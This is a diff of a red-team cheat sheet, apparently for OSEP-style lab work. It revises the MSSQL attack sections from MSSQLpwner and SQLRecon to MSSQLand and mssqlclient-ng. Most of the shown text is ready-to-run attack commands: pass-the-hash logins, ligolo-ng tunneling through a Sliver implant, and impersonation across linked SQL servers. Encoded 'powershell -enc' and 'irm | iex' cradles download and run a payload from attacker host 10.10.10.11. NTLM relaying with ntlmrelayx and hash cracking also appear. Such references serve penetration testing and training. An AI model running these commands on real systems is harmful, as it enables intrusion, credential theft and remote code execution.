@@ -125,10 +125,8 @@ The C# and PowerShell files throughout the cheat sheet should be publicly access
 	- [Queries](#queries)
 	- [MSSQLand](#mssqland)
 		- [Add Custom Command](#add-custom-command)
-	- [MSSQLpwner](#mssqlpwner)
-	- [SQLRecon](#sqlrecon)
-		- [Links Exploitation](#links-exploitation)
-		- [MSSQL - Relaying & Impersonation](#mssql---relaying--impersonation)
+	- [mssqlclient-ng](#mssqlclient-ng)
+	- [MSSQL - Relaying & Impersonation](#mssql---relaying--impersonation)
 	- [PowerUPSQL](#powerupsql)
 - [Armory](#armory)
 	- [SharpLaps](#sharplaps)
@@ -950,9 +948,9 @@ nxc smb 10.10.100.15 -d domain.com -u user -H ffffffffffffffffffffffffffffffff -
 
 
 # DB Spray
-mssqlpwner domain.com/user:password@10.10.100.15 -windows-auth enumerate
-mssqlpwner ./Administrator@10.10.100.15 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth enumerate
-mssqlpwner domain.com/machineaccount\$@10.10.100.15 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth interactive enumerate
+mssqlclient-ng 10.10.100.15 -d domain.com -u user -p password -windows-auth
+mssqlclient-ng 10.10.100.15 -u Administrator -H ':ffffffffffffffffffffffffffffffff'
+mssqlclient-ng 10.10.100.15 -d domain.com -u 'machineaccount$' -H ':ffffffffffffffffffffffffffffffff' -windows-auth
 ```
 
 
@@ -1255,9 +1253,6 @@ powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcA
 # We get the shell back as domain\user and can continue to enumerate
 ```
 
-
-
-
 ## Tunneling
 
 ### Portfwd
@@ -1269,14 +1264,14 @@ portfwd add -b 127.0.0.1:33890 -r 10.10.100.30:3389
 ```
 
 ### Reverse Port Forwarding
+
 Forwarding connections from remote port **7999** to local port **7999**
+
 ```powershell
 sliver (CURIOUS_TRIANGLE) > rportfwd add -b 0.0.0.0:7999 -r 0.0.0.0:7999
 
 [*] Reverse port forwarding 0.0.0.0:7999 <- 0.0.0.0:7999
 ```
-
-
 
 ### Socks5 Proxy
 
@@ -1309,25 +1304,20 @@ sudo proxychains4 -q netexec smb 172.16.103.152
 upload /home/kali/tools/ligolo-ng/agent.exe c:/windows/tasks/agent.exe
 ls c:/windows/tasks/agent.exe
 
-
 # Start the ligolo proxy on kali
 sudo /home/kali/tools/ligolo-ng/proxy -selfcert -laddr 10.10.10.11:4444
-
 
 # Delete the interfaces if already exist (in case ip ranges change on next connection)
 interface_delete --name osep-challenge
 interface_delete --name osep-challenge-vault
 
-
 # After starting, create a interface and assign route
 interface_create --name osep-challenge
 interface_route_add --name osep-challenge --route 10.10.100.0/24
 
-
 # Add another one
 interface_create --name osep-challenge-vault
 interface_route_add --name osep-challenge-vault --route 10.10.200.25/32
-
 
 # Connect from the victim machine back to attacker machine with interactive shell
 shell
@@ -1343,12 +1333,10 @@ execute C:\\Windows\\tasks\\agent.exe -connect 10.10.10.11:4444 -ignore-cert -re
 # Select the session
 session
 
-
 # Start the tunnel 
 tunnel_start --tun osep-challenge
 tunnel_start --tun osep-challenge-vault
 ```
-
 
 #### Port Forwarding through Ligolo 
 
@@ -1634,8 +1622,6 @@ execute-assembly /home/kali/tools/bins/csharp-files/ADSearch.exe --search "(obje
 execute-assembly /home/kali/tools/bins/csharp-files/ADSearch.exe --search "(objectCategory=trustedDomain)" --domain domain.com --attributes distinguishedName,name,flatName,trustDirection
 ```
 
-
-
 ### Shares Enumeration
 
 #### SharpShares
@@ -1645,7 +1631,6 @@ execute-assembly /home/kali/tools/bins/csharp-files/ADSearch.exe --search "(obje
 ```powershell
 execute-assembly -t 200 /home/kali/tools/bins/csharp-files/SharpShares.exe /ldap:all
 ```
-
 
 #### Snaffler
 
@@ -1689,7 +1674,6 @@ Crack the hashes
 ```powershell
 hashcat -m 13100 -a 0 kerb.hashes /usr/share/wordlists/rockyou.txt -w 3 -O
 ```
-
 
 ### ACLs Abuse 
 
@@ -1942,8 +1926,6 @@ impacket-psexec -no-pass -k domain.com/administrator@machine03 -target-ip 10.10.
 impacket-atexec -k -no-pass domain.com/administrator@machine03 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
 ```
 
-
-
 ### RBCD
 
 #### GenericWrite
@@ -2015,9 +1997,6 @@ ls //machine08.domain.com/c$
 # Run psexec now on appsrv01 and get shell access
 psexec -d Title -s Description -p osep-lateral machine08.domain.com
 ```
-
-
-
 
 
 ## Silver Ticket
@@ -2099,11 +2078,6 @@ curl -k --negotiate -u : http://machine05.domain.com/Internal
 curl -k --negotiate -u : http://machine05.domain.com/Internal/Admin
 ```
 
-
-
-
-
-
 ## Domain Lateral Movement
 
 ### Password Change
@@ -2124,21 +2098,17 @@ Creating golden ticket to be a part of EA within the parent domain from the chil
 # Get krbtgt token from the child domain using DCSync
 krbtgt -> ffffffffffffffffffffffffffffffff
 
-
 # Try to access CIFS on DC02
 ls //dc02.domain.com/c$
 
-
 # Check the tickets
 execute -o klist
-
 
 # Get the SIDs for the forest domain and its child
 Get-DomainSID -Domain child.domain.com
 Get-DomainSid -Domain domain.com
 sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainSid -Domain child.domain.com"'
 sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainSid -Domain domain.com"'
-
 
 # We get
 S-1-5-21-2032401531-514583578-4118012345
@@ -2199,9 +2169,10 @@ ls //dc02.dev.domain.com/c$
 psexec -d Title -s Description -p osep-lateral dc02.dev.domain.com
 ```
 
-
-
 ## MSSQL
+
+> [!NOTE]
+> For why [SQLRecon](https://github.com/skahwah/SQLRecon) falls short (no impersonation across linked servers, architectural limitations), see [MSSQLand's ORIGIN.md](https://github.com/n3rada/MSSQLand/blob/main/ORIGIN.md). Use [MSSQLand](https://github.com/n3rada/MSSQLand) instead.
 
 ### SQLMap
 
@@ -2247,11 +2218,14 @@ EXECUTE AS LOGIN = 'sa';EXEC sp_configure 'show advanced options', 1; RECONFIGUR
 
 ### MSSQLand
 
-> This is recommended for everything - labs/exam - @n3rada is really active, drop him a message for any bugs
+> [MSSQLand](https://github.com/n3rada/MSSQLand) - This is recommended for everything - labs/exam - @n3rada is really active, drop him a message for any bugs
+
+> For external (Linux-side) access with pass-the-hash or Kerberos, use [mssqlclient-ng](https://github.com/n3rada/mssqlclient-ng)
 
 > **Note:** Sliver supports custom aliases
 
 #### Add Custom Command
+
 1. Locate aliases directory
 ```powershell
 /home/kali/.sliver-client/aliases
@@ -2262,14 +2236,14 @@ EXECUTE AS LOGIN = 'sa';EXEC sp_configure 'show advanced options', 1; RECONFIGUR
 ```powershell
 {
     "name": "MSSQLand",
-    "version": "v1.0",
+    "version": "v2.0",
     "command_name": "mssqland",
     "original_author": "n3rada",
     "repo_url": "https://github.com/n3rada/MSSQLand",
     "help": "Effortlessly navigate and conquer linked Microsoft SQL Server (MS SQL) servers",
     "entrypoint": "Main",
     "allow_args": true,
-    "default_args": "/help",
+    "default_args": "",
     "is_reflective": false,
     "is_assembly": true,
     "files": [
@@ -2297,202 +2271,96 @@ mssqland
 └── MSSQLand.exe
 ```
 
+#### CLI Syntax
+
+```
+MSSQLand.exe <host> -c <cred> [options] <action> [action-args]
+```
+
+- Host format: `server:port/user@database` (only `server` is required)
+- `/user` on host = impersonate that login (cascading: `/user1/user2`)
+- `-l` linked server chain uses **semicolons**: `-l SQL01;SQL02/user;SQL03@db`
 
 ```powershell
 # Local Authentication on different SQL servers
-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01 /action:whoami
-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql02 /action:whoami
-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql03 /action:whoami
-
+execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql01 -c local -u localuser -p password whoami
+execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql02 -c local -u localuser -p password whoami
+execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql03 -c local -u localuser -p password whoami
 
 # Token authentication (current user)
-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql04 /a:whoami
-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:localhost /a:whoami
-
+execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql04 -c token whoami
+execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe localhost -c token whoami
 
 # Check what user can be impersonated on current instance
-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01 /a:impersonate
+execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql01 -c token impersonate
 
+# Map the linked server chains (really useful)
+execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql01 -c local -u localuser -p password linkmap
+# SQL01 (localuser [dbo]) ---> SQL02 (localGroup [dbo]) ---> SQL03 (localapps [guest])
+# SQL01 (localuser [dbo]) ---> SQL03 (localAccount [dbo]) ---> SQL02 (localGroup [dbo]) ---> SQL03 (localapps [guest])
 
-# List down the chained links
-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01 /action:linkmap
+# Traverse linked servers (/user on host = impersonate before traversing, /user in -l chain = impersonate per hop)
+execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql01 -c local -u localuser -p password -l sql02 whoami
+execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql01/localuser -c local -u localuser -p password -l sql02 whoami
+execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql01/localuser -c local -u localuser -p password -l sql03 whoami
+execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql01/devUser -c token -l "SQL02;sql01" whoami
 
+# Longer chain with per-hop impersonation - sql01 -> sql03 (as localAccount) -> sql02 (as localGroup)
+execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql01/localuser -c local -u localuser -p password -l "SQL03/localAccount;SQL02/localGroup" whoami
 
-# Linkmap to check links (really useful)
-SQL01 (localuser [dbo]) ---> SQL02 (localGroup [dbo]) ---> SQL03 (localapps [guest])
-SQL01 (localuser [dbo]) ---> SQL03 (localAccount [dbo]) ---> SQL02 (localGroup [dbo]) ---> SQL03 (localapps [guest])
+# Get sliver shell via PowerShell download-and-execute
+execute-assembly -t 40 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql01/webapp11 -c local -u localuser -p password -l sql27 powershell "irm http://10.10.10.11/hav0c-ps.txt | iex"
+execute-assembly -t 40 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql01/webapp11 -c local -u localuser -p password -l sql53 powershell "irm http://10.10.10.11/hav0c-ps.txt | iex"
+execute-assembly -t 40 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql01/devUser -c token -l "SQL02;sql01" powershell "irm http://10.10.10.11/hav0c-ps.txt | iex"
+execute-assembly -t 40 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql01/devUser -c token -l "SQL02;sql01;SQL02" powershell "irm http://10.10.10.11/hav0c-ps.txt | iex"
 
-
-# Impersonate user across link
-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01 /l:sql02 /action:whoami
-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01:localuser /l:sql02 /action:whoami
-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01:localuser /l:sql03 /action:whoami
-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01 /a:whoami
-
-
-# Impersonating users across link - sql01 -> sql03 -> sql02
-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01:localuser /l:SQL03:localAccount,SQL02:localGroup /action:whoami
-
-
-# Get sliver shell
-execute-assembly -t 40 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01:webapp11 /l:sql27 /action:pwshdl '10.10.10.11/hav0c-ps.txt'
-execute-assembly -t 40 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01:webapp11 /l:sql53 /action:pwshdl '10.10.10.11/hav0c-ps.txt'
-execute-assembly -t 40 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01 /a:pwshdl "10.10.10.11/hav0c-ps.txt"
-execute-assembly -t 40 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01,SQL02 /a:pwshdl "10.10.10.11/hav0c-ps.txt"
-
-
-# Search Databases (within link)
-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01,SQL02 /a:databases
-
-
-# Search strings in databases (with spaces, for each string)
-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01,SQL02 /a:search wordpress
-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01,SQL02 /a:search wordpress admin
+# List databases and search strings
+execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql01/devUser -c token -l "SQL02;sql01;SQL02" databases
+execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql01/devUser -c token -l "SQL02;sql01;SQL02" search wordpress
+execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql01/devUser -c token -l "SQL02;sql01;SQL02" search wordpress admin
 ```
 
+### mssqlclient-ng
 
+> [mssqlclient-ng](https://github.com/n3rada/mssqlclient-ng) — Linux-side MS SQL client. Ideal for PTH, Kerberos, and external access through a SOCKS5 proxy from your beacon.
 
+```shell
+# Windows authentication with password
+mssqlclient-ng 10.10.100.15 -d domain.com -u domainuser -p 'password' -windows-auth
 
-### MSSQLpwner
+# Pass-the-Hash (domain user)
+mssqlclient-ng 10.10.100.15 -d domain.com -u Administrator -H ':ffffffffffffffffffffffffffffffff' -windows-auth
 
-```powershell
-# Try and check permissions as different users - PTH and creds
-mssqlpwner domain.com/domainuser:8b1B0BzGvj9J@10.10.100.15 -windows-auth interactive enumerate
-mssqlpwner ./Administrator@10.10.100.15 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth interactive enumerate
-mssqlpwner domain.com/machine01\$@10.10.100.15 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth interactive enumerate
+# Pass-the-Hash (local user)
+mssqlclient-ng 10.10.100.15 -u Administrator -H ':ffffffffffffffffffffffffffffffff'
 
+# Machine account PTH
+mssqlclient-ng 10.10.100.15 -d domain.com -u 'machine01$' -H ':ffffffffffffffffffffffffffffffff' -windows-auth
 
-# For local authentication
-mssqlpwner localuser:password@10.10.200.130 interactive enumerate
+# Local SQL authentication
+mssqlclient-ng 10.10.200.130 -u localuser -p password
 
+# Kerberos authentication (use with proxychains + SOCKS5 from beacon)
+mssqlclient-ng sql01.domain.com -k
 
-# Run command on the link
-mssqlpwner localuser:password@10.10.200.130 -link-name SQL01 exec hostname
-mssqlpwner localuser:password@10.10.200.130 -link-name SQL02 exec hostname
-mssqlpwner localuser:password@10.10.200.130 -link-name SQL03 exec hostname
-mssqlpwner dev.domain.com/machine01\$@10.10.200.131 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth -link-name SQL04 exec hostname
+# Traverse linked servers and run whoami
+mssqlclient-ng 10.10.200.130 -u localuser -p password -l "SQL01;SQL02;SQL03" -a whoami
 
+# Traverse linked servers with per-hop impersonation
+mssqlclient-ng 10.10.200.131 -d domain.com -u 'machine01$' -H ':ffffffffffffffffffffffffffffffff' -windows-auth -l "SQL04/admin" -a whoami
 
-# Get reverse shell
-mssqlpwner localuser:password@10.10.200.130 -link-name SQL03 exec 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
-
-
-# Use specific link
-mssqlpwner -hashes ':ffffffffffffffffffffffffffffffff' ./Administrator@10.10.200.131 -windows-auth -link-name sql03 enumerate interactive
-
-
-# Get the chain list accessible
-get-chain-list
-
-
-# Set chain to that of dba access on a linked machine
-set-chain c99e9ea1-6f06-4f85-85b0-4b65d11d4a3a
-
-
-# Run command on the selected chain
-exec "whoami /all"
-
-
-# Sliver session
-exec 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
+# Get reverse shell via linked server
+mssqlclient-ng 10.10.200.130 -u localuser -p password -l "SQL03" -a xpcmd "irm http://10.10.10.11/hav0c-ps.txt | iex"
 ```
 
-
-### SQLRecon
-
-> I don't like using this as impersonation across links is not supported by SQLRecon
-
-```powershell
-# Enumerate spn
-sqlrecon -- /enum:sqlspns
-
-
-# Whoami
-sqlrecon -- /auth:wintoken /h:sql01 /m:whoami
-sqlrecon -- /auth:Local /u:localuser /p:password /h:sql01 /m:whoami
-
-
-# Info of server
-sqlrecon -- /auth:Local /u:localuser /p:password /h:sql01 /module:info
-
-
-# Who can we impersonate? 
-sqlrecon -- /auth:Local /u:localuser /p:password /h:sql01 /m:impersonate
-
-
-# Impersonation - Fails
-sqlrecon -- /auth:Local /u:localuser /p:password /h:sql01 /m:whoami /i:sa
-
-
-# Current user
-execute-assembly /home/kali/tools/bins/csharp-files/SQLRecon.exe '/a:wintoken /h:sql01 /m:query /command:"select SYSTEM_USER"'
-
-
-# Enable XpCMDShell
-sqlrecon -- /a:wintoken /h:sql01 /m:enablexp
-
-
-# Command Execution
-sqlrecon -- /a:wintoken /h:sql01 /m:xpcmd /i:sa /c:ipconfig
-
-
-# Get shell through sql01
-inline-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/SQLRecon.exe '/a:wintoken /h:sql01 /m:xpcmd /c:"powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="'
-
-
-# Enumerate links
-sqlrecon -- /a:wintoken /h:sql01 /m:links
-```
-
-
-#### Links Exploitation
-
-The links exploitation of SQLRecon is limited. Use MSSQLand to ease the process and to impersonate user across multiple links.
-
-```powershell
-# Links & Crawling - https://github.com/skahwah/SQLRecon/wiki/5.-Linked-Modules
-# Essentially, its just adding /l:server and then rest of the query is same as before
-# Enumerate links
-sqlrecon -t 20 -- /auth:Local /u:localuser /p:password /h:sql01 /m:links
-
-
-# Run SQL queries on the linked server
-sqlrecon -- '/auth:Local /u:localuser /p:password /h:sql01 /m:query /command:"SELECT srvname, srvproduct, rpcout FROM master..sysservers"'
-
-
-# Run further modules to get info/whoami/user and server name
-sqlrecon -t 20 -- '/auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:info'
-sqlrecon -t 20 -- '/auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:whoami'
-sqlrecon -t 20 -- '/auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:query /c:"select @@servername"'
-sqlrecon -t 20 -- '/auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:query /c:"select SYSTEM_USER"'
-
-
-# Check RPC enabled
-sqlrecon -t 20 -- /auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:checkrpc
-sqlrecon -t 20 -- /auth:Local /u:localuser /p:password /h:sql01 /l:sql03 /m:checkrpc
-
-
-# Enable xpcmd
-sqlrecon -t 20 -- /auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:enablexp
-sqlrecon -t 20 -- /auth:Local /u:localuser /p:password /h:sql01 /l:sql03 /m:enablexp
-
-
-# Shell for sql02
-inline-execute-assembly -t 50 /home/kali/tools/bins/csharp-files/SQLRecon.exe '/auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:xpcmd /c:"powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="'
-```
-
-
-#### MSSQL - Relaying & Impersonation
+### MSSQL - Relaying & Impersonation
 
 Really good article on relaying to MSSQL
 - https://lsecqt.github.io/Red-Teaming-Army/active-directory/compromising-mssql-databases-by-relaying/
 
-
-```powershell
-# We get callback from attacker user account from sql01
-sqlrecon -i -- /a:wintoken /h:sql01 /m:smb /unc:\\\\10.10.10.11\\testpath
-
-ffffffffffffffffffffffffffffffff
+```shell
+# Force SMB callback from sql01 to capture NTLMv2 hash (start responder first)
+execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe sql01 -c token smb 10.10.10.11
 
 # We get the following hash
 [SMB] NTLMv2-SSP Client   : 192.168.10.30
@@ -2503,21 +2371,15 @@ ffffffffffffffffffffffffffffffff
 # Attempt to crack the hash received within responder
 hashcat -m 5600 attacker.hash /usr/share/wordlists/rockyou.txt --force
 
-
 # Write all hosts into the file and relay to all
 sudo impacket-ntlmrelayx --no-http-server -smb2support -tf hosts.txt -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
 
-
-# Relaying to single host and executing command if authentication succeeds
+# Relaying to single host
 sudo impacket-ntlmrelayx --no-http-server -smb2support -t 172.16.100.110 -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
 
-
-# We can also try impacket-mssqlclient for relaying and authentication
+# Relay directly to MSSQL
 sudo proxychains impacket-ntlmrelayx --no-http-server -smb2support -t mssql://172.16.100.110 -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
 ```
-
-
-
 
 ### PowerUPSQL
 
